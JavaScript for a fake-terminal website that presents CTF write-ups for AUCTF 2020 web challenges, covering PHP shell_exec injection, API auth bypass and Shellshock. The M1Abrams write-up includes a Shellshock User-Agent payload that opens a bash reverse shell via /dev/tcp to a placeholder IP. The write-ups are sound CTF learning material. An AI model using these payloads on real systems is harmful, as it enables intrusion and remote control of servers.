"use strict";

/**
 * Configs
 */
var configs = (function () {
    var instance;
    var Singleton = function (options) {
        var options = options || Singleton.defaultOptions;
        for (var key in Singleton.defaultOptions) {
            this[key] = options[key] || Singleton.defaultOptions[key];
        }
    };
    Singleton.defaultOptions = {
        general_help: "Below there's a list of commands that you can use.\nYou can use autofill by pressing the TAB key, autocompleting if there's only 1 possibility, or showing you a list of possibilities.",
        ls_help: "List information about the files and folders (the current directory by default).",
        cat_help: "Read FILE(s) content and print it to the standard output (screen).",
        whoami_help: "Print the user name associated with the current effective user ID and more info.",
        date_help: "Print the system date and time.",
        help_help: "Print this menu.",
        clear_help: "Clear the terminal screen.",
        reboot_help: "Reboot the system.",
        graphic_help: "Displays the site in a more graphic way.",
        cd_help: "Change the current working directory.",
        mv_help: "Move (rename) files.",
        rm_help: "Remove files or directories.",
        rmdir_help: "Remove directory, this command will only work if the folders are empty.",
        touch_help: "Change file timestamps. If the file doesn't exist, it's created an empty one.",
        sudo_help: "Execute a command as the superuser.",
        welcome: "AUCTF - 2020 - Web\nTo show writeups in graphic mode, enter the command 'show', else, use cat.",
        internet_explorer_warning: "NOTE: I see you're using internet explorer, this sound bad for this website and your security.",
        welcome_file_name: "welcome_message.txt",
        invalid_command_message: "<value>: command not found.",
        reboot_message: "Preparing to reboot...\n\n3...\n\n2...\n\n1...\n\nRebooting...\n\n",
        permission_denied_message: "Unable to '<value>', permission denied.",
        sudo_message: "Unable to sudo using a web client.",
        usage: "Usage",
        file: "file",
        folder: "folder",
        folder_not_found: "'<value>': not such directory.",
        file_not_found: "File '<value>' not found.",
        username: "Username",
        hostname: "Host",
        platform: "Platform",
        accesible_cores: "Accessible cores",
        language: "Language",
        value_token: "<value>",
        host: "wortyClient",
        user: "guest",
        is_root: false,
        type_delay: 5
    };
    return {
        getInstance: function (options) {
            instance === void 0 && (instance = new Singleton(options));
            return instance;
        }
    };
})();

/**
 * Your files here
 */
var files = (function () {
    var instance;
    var Singleton = function (options) {
        var options = options || Singleton.defaultOptions;
        for (var key in Singleton.defaultOptions) {
            this[key] = options[key] || Singleton.defaultOptions[key];
        }
    };
    Singleton.defaultOptions = {
        "QuickMaths":`
        ----------------------------------------------------------------------------
        Prompt: 
        two plus two is four minus three that's one quick maths
        ----------------------------------------------------------------------------
        We're coming up on a simple online calculator. So we test 2+2, which makes us 4.

        I try to pass a phpinfo(), it works and I get the disabled functions, the php version, ...

        I see that the shell_exec function is not disabled, perfect!

        So I pass a shell_exec('ls');, which returns :

        index.php

        So I figure the flag must be in index.php. So I make a shell_exec('cat index.php');. 
        Then I inspect the source code: auctf{p6p_1nj3c7i0n_iz_k3wl}.
        `,
        "ggNoRe":`
        ---------------------------------------------------------------------------------------------
        Prompt:
        A junior dev built this site but we want you to test it before we send it to production.
        ---------------------------------------------------------------------------------------------
        When you get to the site, you see: "Nothing to see here". So I decide to inspect the element, and there is a script: authentication.js.
        In this file, we see an array containing base 64, we decode it, and we get: "Send a get request to /hidden/nextstep.php". So we send a GET request to this page.

        When we analyze the headers, one spring in particular :
        ROT 13 : Fraq n cbfg erdhrfg gb /ncv/svany.cuc.
        We decode it, we get : Send a post request to /api/final.php.

        So we send a POST request to /api/final.php, the server replies: Send a post request with flag variable set.

        So we modify our request to send a flag variable in POST.
        We get our flag: auctf{1_w@s_laZ_w1t_dis_0N3}. 
        `,
        "APIMadness":`
        -----------------------------------------------------------------------------
        Prompt: 
        We are building out our new API. We even have authentication built in!
        -----------------------------------------------------------------------------
        We arrive on the site, which suggests us to look at /static/help, we reach this page, which answers us:

        POST: 
        /api/login 
        /api/ftp/dir 
        /api/ftp/get 
        
        First of all, I tried to send the username and password parameters in the classical way: http://challenges.auctf.com:30023/api/login?username=admin&password=admin.
        The server replies with a 400 Bad Request.
        So this is not the way to pass the information in POST. 

        So I choose to send them in JSON format.

        So we send this request (on the endpoint /api/login), thanks to curl : 
        curl -X POST -H 'Content-type: application/json' -d '{"username": "username", "password": "password"}' http://challenges.auctf.com:30023/api/login

        It takes several minutes for the server to respond. The response is weird, it's a python stack trace. In this trace, we notice that /api/login calls /api/login_check with the JSON passed in parameters. Moreover, we notice that if the passed login is valid, the server answers us with a token.

        So we try several identifiers on this endpoint, we find :
        username:username
        admin:admin

        So we type on the endpoint /ftp/api/get: 
        curl -X POST -H 'Content-type: application/json' -d '{"token": "token_hash", "dir":""."}' http://challenges.auctf.com:30023/api/ftp/dir

        With the response from the server, we notice that there is a flag.txt file. So we send this request :
        curl -X POST -H 'Content-type: application/json' -d '{"token": "token_hash", "file": "flag.txt"}' http://challenges.auctf.com:30023/api/ftp/get_file

        We get the flag in base64: YXVjdGZ7MHdAc3BfNnJvSzNOX0B1dGh9Cg==
        We decode it, we get: auctf{0w@sp_6roK3N_@uth}.
        `,
        "M1Abrams":`
        ---------------------------------------------------------------------------------------------------------
        Prompt: 
        We built up this server, and our security team seems pretty mad about it. See if you can find out why.
        ---------------------------------------------------------------------------------------------------------
        Arriving on this site, we notice that we have the basic index.html of Apache2. 
        We do a dirb on this site, we see that everything is in 403, except index.html.

        So we try to look at the source code, we notice, that in HTML comment, there is a link that refers to a bug in Apache that is linked to a CVE (CVE-2016-4979). Unfortunately, this CVE applies to the Apache2 server < 2.24.20, but our version is 2.24.29.

        So we keep looking, and the only possible flaw with the results we get is in /cgi-bin/, exploiting the shellshock vulnerability.
        This vulnerability consists in exploiting a script to execute bash commands as a www-data user (uid: 33).

        So we decide to bruteforce with the big.txt wordlist of dirb. After a few minutes, we boot a file in /cgi-bin/ : scriptlet.

        So we connect to /cgi-bin/scriptlet, which sends us back :

        uid=33(www-data) gid=33(www-data) groups=33(www-data)


        So we exploit the shellshock vulnerability to launch a reverse shell with the curl command :

        curl -A '() { :; };echo;echo;bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' http://challenges.auctf.com:30024/cgi-bin/scriptlet

        From our pc, we connect with the netcat command : nc challenges.auctf.com <PORT>

        We list the different folders, in /, we notice a flag.file.
        This file is encoded, but, when we string it, we see that there is a flag.txt file in it.
        So we download the flag.file thanks to the shellshock vulnerability.

        We make a file command on this file, it's a gz archive!
        So we change the name of the file, Because gz cannot decompress a file if it doesn't have a .gz extension: mv temp temp.gz

        Gunzip it : gzip -d temp.gz.
        We recover a file name temp, which is ascii, we display it, we get the flag: auctf{$h311_Sh0K_m3_z@ddY}.
        `
    };
    return {
        getInstance: function (options) {
            instance === void 0 && (instance = new Singleton(options));
            return instance;
        }
    };
})();

/**
 * Directories here
 */
var folders = (function () {
    var instance;
    var SingletonFolders = function (options){
        var options = options || SingletonFolders.defaultOptions;
        for(var key in SingletonFolders.defaultOptions){
            this[key] = options[key] || SingletonFolders.defaultOptions[key];
        }
    };
    SingletonFolders.defaultOptions = {
        "/": "../index.html",
        "..": "../auctf2020.html"
    };
    return{
        getInstance: function(options){
            instance == void 0 && (instance = new SingletonFolders(options));
            return instance;
        }
    };
})();
var main = (function () {

    /**
     * Aux functions
     */
    var isUsingIE = window.navigator.userAgent.indexOf("MSIE ") > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./);

    var ignoreEvent = function (event) {
        event.preventDefault();
        event.stopPropagation();
    };
    
    var scrollToBottom = function () {
        window.scrollTo(0, document.body.scrollHeight);
    };
    
    var isURL = function (str) {
        return (str.startsWith("http") || str.startsWith("www")) && str.indexOf(" ") === -1 && str.indexOf("\n") === -1;
    };
    
    /**
     * Model
     */
    var InvalidArgumentException = function (message) {
        this.message = message;
        // Use V8's native method if available, otherwise fallback
        if ("captureStackTrace" in Error) {
            Error.captureStackTrace(this, InvalidArgumentException);
        } else {
            this.stack = (new Error()).stack;
        }
    };
    // Extends Error
    InvalidArgumentException.prototype = Object.create(Error.prototype);
    InvalidArgumentException.prototype.name = "InvalidArgumentException";
    InvalidArgumentException.prototype.constructor = InvalidArgumentException;

    var cmds = {
        LS: { value: "ls", help: configs.getInstance().ls_help },
        CAT: { value: "cat", help: configs.getInstance().cat_help },
        WHOAMI: { value: "whoami", help: configs.getInstance().whoami_help },
        DATE: { value: "date", help: configs.getInstance().date_help },
        HELP: { value: "help", help: configs.getInstance().help_help },
        CLEAR: { value: "clear", help: configs.getInstance().clear_help },
        REBOOT: { value: "reboot", help: configs.getInstance().reboot_help },
        CD: { value: "cd", help: configs.getInstance().cd_help },
        MV: { value: "mv", help: configs.getInstance().mv_help },
        RM: { value: "rm", help: configs.getInstance().rm_help },
        RMDIR: { value: "rmdir", help: configs.getInstance().rmdir_help },
        TOUCH: { value: "touch", help: configs.getInstance().touch_help },
        SUDO: { value: "sudo", help: configs.getInstance().sudo_help }
    };

    var Terminal = function (prompt, cmdLine, output, sidenav, profilePic, user, host, root, outputTimer) {
        if (!(prompt instanceof Node) || prompt.nodeName.toUpperCase() !== "DIV") {
            throw new InvalidArgumentException("Invalid value " + prompt + " for argument 'prompt'.");
        }
        if (!(cmdLine instanceof Node) || cmdLine.nodeName.toUpperCase() !== "INPUT") {
            throw new InvalidArgumentException("Invalid value " + cmdLine + " for argument 'cmdLine'.");
        }
        if (!(output instanceof Node) || output.nodeName.toUpperCase() !== "DIV") {
            throw new InvalidArgumentException("Invalid value " + output + " for argument 'output'.");
        }
        if (!(sidenav instanceof Node) || sidenav.nodeName.toUpperCase() !== "DIV") {
            throw new InvalidArgumentException("Invalid value " + sidenav + " for argument 'sidenav'.");
        }
        if (!(profilePic instanceof Node) || profilePic.nodeName.toUpperCase() !== "IMG") {
            throw new InvalidArgumentException("Invalid value " + profilePic + " for argument 'profilePic'.");
        }
        (typeof user === "string" && typeof host === "string") && (this.completePrompt = user + "@" + host + ":~/writeups/auctf2020/web/" + (root ? "#" : "$"));
        this.profilePic = profilePic;
        this.prompt = prompt;
        this.cmdLine = cmdLine;
        this.output = output;
        this.sidenav = sidenav;
        this.sidenavOpen = false;
        this.sidenavElements = [];
        this.typeSimulator = new TypeSimulator(outputTimer, output);
    };

    Terminal.prototype.type = function (text, callback) {
        this.typeSimulator.type(text, callback);
    };

    Terminal.prototype.exec = function () {
        var command = this.cmdLine.value;
        this.cmdLine.value = "";
        this.prompt.textContent = "";
        this.output.innerHTML += "<span class=\"prompt-color\">" + this.completePrompt + "</span> " + command + "<br/>";
    };

    Terminal.prototype.init = function () {
        this.sidenav.addEventListener("click", ignoreEvent);
        this.cmdLine.disabled = true;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = true;
        });
        this.prepareSideNav();
        this.lock(); // Need to lock here since the sidenav elements were just added
        document.body.addEventListener("click", function (event) {
            if (this.sidenavOpen) {
                this.handleSidenav(event);
            }
            this.focus();
        }.bind(this));
        this.cmdLine.addEventListener("keydown", function (event) {
            if (event.which === 13 || event.keyCode === 13) {
                this.handleCmd();
                ignoreEvent(event);
            } else if (event.which === 9 || event.keyCode === 9) {
                this.handleFill();
                ignoreEvent(event);
            }
        }.bind(this));
        this.reset();
    };

    Terminal.makeElementDisappear = function (element) {
        element.style.opacity = 0;
        element.style.transform = "translateX(-300px)";
    };

    Terminal.makeElementAppear = function (element) {
        element.style.opacity = 1;
        element.style.transform = "translateX(0)";
    };

    Terminal.prototype.prepareSideNav = function () {
        var capFirst = (function () {
            return function (string) {
                return string.charAt(0).toUpperCase() + string.slice(1);
            }
        })();
        for (var file in files.getInstance()) {
            var element = document.createElement("button");
            Terminal.makeElementDisappear(element);
            element.onclick = function (file, event) {
                this.handleSidenav(event);
                this.cmdLine.value = "cat " + file + " ";
                this.handleCmd();
            }.bind(this, file);
            element.appendChild(document.createTextNode(capFirst(file.replace(/\.[^/.]+$/, "").replace(/_/g, " "))));
            this.sidenav.appendChild(element);
            this.sidenavElements.push(element);
        }
        // Shouldn't use document.getElementById but Terminal is already using loads of params
        document.getElementById("sidenavBtn").addEventListener("click", this.handleSidenav.bind(this));
    };

    Terminal.prototype.handleSidenav = function (event) {
        if (this.sidenavOpen) {
            this.profilePic.style.opacity = 0;
            this.sidenavElements.forEach(Terminal.makeElementDisappear);
            this.sidenav.style.width = "50px";
            document.getElementById("sidenavBtn").innerHTML = "&#9776;";
            this.sidenavOpen = false;
        } else {
            this.sidenav.style.width = "300px";
            this.sidenavElements.forEach(Terminal.makeElementAppear);
            document.getElementById("sidenavBtn").innerHTML = "&times;";
            this.profilePic.style.opacity = 1;
            this.sidenavOpen = true;
        }
        document.getElementById("sidenavBtn").blur();
        ignoreEvent(event);
    };

    Terminal.prototype.lock = function () {
        this.exec();
        this.cmdLine.blur();
        this.cmdLine.disabled = true;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = true;
        });
    };

    Terminal.prototype.unlock = function () {
        this.cmdLine.disabled = false;
        this.prompt.textContent = this.completePrompt;
        this.sidenavElements.forEach(function (elem) {
            elem.disabled = false;
        });
        scrollToBottom();
        this.focus();
    };

    Terminal.prototype.handleFill = function () {
        var cmdComponents = this.cmdLine.value.trim().split(" ");
        if ((cmdComponents.length <= 1) || (cmdComponents.length === 2 && cmdComponents[0] === cmds.CAT.value)) {
            this.lock();
            var possibilities = [];
            if (cmdComponents[0].toLowerCase() === cmds.CAT.value) {
                if (cmdComponents.length === 1) {
                    cmdComponents[1] = "";
                }
                for (var file in files.getInstance()) {
                    if (file.toLowerCase().startsWith(cmdComponents[1].toLowerCase())) {
                        possibilities.push(cmds.CAT.value + " " + file);
                    }
                }
            } else {
                for (var command in cmds) {
                    if (cmds[command].value.startsWith(cmdComponents[0].toLowerCase())) {
                        possibilities.push(cmds[command].value);
                    }
                }
            }
            if (possibilities.length === 1) {
                this.cmdLine.value = possibilities[0] + " ";
                this.unlock();
            } else if (possibilities.length > 1) {
                this.type(possibilities.join("\n"), function () {
                    this.cmdLine.value = cmdComponents.join(" ");
                    this.unlock();
                }.bind(this));
            } else {
                this.cmdLine.value = cmdComponents.join(" ");
                this.unlock();
            }
        }else if ((cmdComponents.length <= 1) || (cmdComponents.length === 2 && cmdComponents[0] === cmds.CD.value)) {
            this.lock();
            var possibilities = [];
            if (cmdComponents[0].toLowerCase() === cmds.CD.value) {
                if (cmdComponents.length === 1) {
                    cmdComponents[1] = "";
                }
                for (var folder in folders.getInstance()) {
                    if (folder.toLowerCase().startsWith(cmdComponents[1].toLowerCase())) {
                        possibilities.push(cmds.CD.value + " " + folder);
                    }
                }
            } else {
                for (var command in cmds) {
                    if (cmds[command].value.startsWith(cmdComponents[0].toLowerCase())) {
                        possibilities.push(cmds[command].value);
                    }
                }
            }
            if (possibilities.length === 1) {
                this.cmdLine.value = possibilities[0] + " ";
                this.unlock();
            } else if (possibilities.length > 1) {
                this.type(possibilities.join("\n"), function () {
                    this.cmdLine.value = cmdComponents.join(" ");
                    this.unlock();
                }.bind(this));
            } else {
                this.cmdLine.value = cmdComponents.join(" ");
                this.unlock();
            }
        }
    };

    Terminal.prototype.handleCmd = function () {
        var cmdComponents = this.cmdLine.value.trim().split(" ");
        this.lock();
        switch (cmdComponents[0]) {
            case cmds.CAT.value:
                this.cat(cmdComponents);
                break;
            case cmds.LS.value:
                this.ls();
                break;
            case cmds.WHOAMI.value:
                this.whoami();
                break;
            case cmds.DATE.value:
                this.date();
                break;
            case cmds.HELP.value:
                this.help();
                break;
            case cmds.CLEAR.value:
                this.clear();
                break;
            case cmds.REBOOT.value:
                this.reboot();
                break;
            case cmds.CD.value:
                this.cd(cmdComponents);
                break;
            case cmds.MV.value:
            case cmds.RMDIR.value:
            case cmds.RM.value:
            case cmds.TOUCH.value:
                this.permissionDenied(cmdComponents);
                break;
            case cmds.SUDO.value:
                this.sudo();
                break;
            default:
                this.invalidCommand(cmdComponents);
                break;
        };
    };

    Terminal.prototype.cd = function (cmdComponents) {
        var result;
        if(cmdComponents.length <= 1 || cmdComponents.length > 2){
            result = configs.getInstance().usage + ": " + cmds.CD.value + " <"+ configs.getInstance().folder + ">";
            this.type(result, this.unlock.bind(this));
        }else if (!cmdComponents[1] || !folders.getInstance().hasOwnProperty(cmdComponents[1])){
            result = configs.getInstance().folder_not_found.replace(configs.getInstance().value_token, cmdComponents[1]);
            this.type(result, this.unlock.bind(this));
        }else{
            window.location.href = folders.getInstance()[cmdComponents[1]];
        }
    };

    Terminal.prototype.cat = function (cmdComponents) {
        var result;
        if (cmdComponents.length <= 1) {
            result = configs.getInstance().usage + ": " + cmds.CAT.value + " <" + configs.getInstance().file + ">";
        } else if (!cmdComponents[1] || (!cmdComponents[1] === configs.getInstance().welcome_file_name || !files.getInstance().hasOwnProperty(cmdComponents[1]))) {
            result = configs.getInstance().file_not_found.replace(configs.getInstance().value_token, cmdComponents[1]);
        } else {
            result = cmdComponents[1] === configs.getInstance().welcome_file_name ? configs.getInstance().welcome : files.getInstance()[cmdComponents[1]];
        }
        this.type(result, this.unlock.bind(this));
    };

    Terminal.prototype.ls = function () {
        var result ="";
        for(var folder in folders.getInstance()){
            result += "drwxr-xr-x "+folder+"\n";
        }
        for (var file in files.getInstance()) {
            result += "-rw-r--r-- "+file + "\n";
        }
        this.type(result.trim(), this.unlock.bind(this));
    };

    Terminal.prototype.sudo = function () {
        this.type(configs.getInstance().sudo_message, this.unlock.bind(this));
    }

    Terminal.prototype.whoami = function (cmdComponents) {
        var result = configs.getInstance().username + ": " + configs.getInstance().user + "\n" + configs.getInstance().hostname + ": " + configs.getInstance().host + "\n" + configs.getInstance().platform + ": " + navigator.platform + "\n" + configs.getInstance().accesible_cores + ": " + navigator.hardwareConcurrency + "\n" + configs.getInstance().language + ": " + navigator.language;
        this.type(result, this.unlock.bind(this));
    };

    Terminal.prototype.date = function (cmdComponents) {
        this.type(new Date().toString(), this.unlock.bind(this));
    };

    Terminal.prototype.help = function () {
        var result = configs.getInstance().general_help + "\n\n";
        for (var cmd in cmds) {
            result += cmds[cmd].value + " - " + cmds[cmd].help + "\n";
        }
        this.type(result.trim(), this.unlock.bind(this));
    };

    Terminal.prototype.clear = function () {
        this.output.textContent = "";
        this.prompt.textContent = "";
        this.prompt.textContent = this.completePrompt;
        this.unlock();
    };

    Terminal.prototype.reboot = function () {
        this.type(configs.getInstance().reboot_message, this.reset.bind(this));
    };

    Terminal.prototype.reset = function () {
        this.output.textContent = "";
        this.prompt.textContent = "";
        if (this.typeSimulator) {
            this.type(configs.getInstance().welcome + (isUsingIE ? "\n" + configs.getInstance().internet_explorer_warning : ""), function () {
                this.unlock();
            }.bind(this));
        }
    };

    Terminal.prototype.permissionDenied = function (cmdComponents) {
        this.type(configs.getInstance().permission_denied_message.replace(configs.getInstance().value_token, cmdComponents[0]), this.unlock.bind(this));
    };

    Terminal.prototype.invalidCommand = function (cmdComponents) {
        this.type(configs.getInstance().invalid_command_message.replace(configs.getInstance().value_token, cmdComponents[0]), this.unlock.bind(this));
    };

    Terminal.prototype.focus = function () {
        this.cmdLine.focus();
    };

    var TypeSimulator = function (timer, output) {
        var timer = parseInt(timer);
        if (timer === Number.NaN || timer < 0) {
            throw new InvalidArgumentException("Invalid value " + timer + " for argument 'timer'.");
        }
        if (!(output instanceof Node)) {
            throw new InvalidArgumentException("Invalid value " + output + " for argument 'output'.");
        }
        this.timer = timer;
        this.output = output;
    };

    TypeSimulator.prototype.type = function (text, callback) {
        if (isURL(text)) {
            window.open(text);
        }
        var i = 0;
        var output = this.output;
        var timer = this.timer;
        var skipped = false;
        var skip = function () {
            skipped = true;
        }.bind(this);
        document.addEventListener("dblclick", skip);
        (function typer() {
            if (i < text.length) {
                var char = text.charAt(i);
                var isNewLine = char === "\n";
                output.innerHTML += isNewLine ? "<br/>" : char;
                i++;
                if (!skipped) {
                    setTimeout(typer, isNewLine ? timer : timer);
                } else {
                    output.innerHTML += (text.substring(i).replace(new RegExp("\n", 'g'), "<br/>")) + "<br/>";
                    document.removeEventListener("dblclick", skip);
                    callback();
                }
            } else if (callback) {
                output.innerHTML += "<br/>";
                document.removeEventListener("dblclick", skip);
                callback();
            }
            scrollToBottom();
        })();
    };

    return {
        listener: function () {
            new Terminal(
                document.getElementById("prompt"),
                document.getElementById("cmdline"),
                document.getElementById("output"),
                document.getElementById("sidenav"),
                document.getElementById("profilePic"),
                configs.getInstance().user,
                configs.getInstance().host,
                configs.getInstance().is_root,
                configs.getInstance().type_delay
            ).init();
        }
    };
})();

window.onload = main.listener;
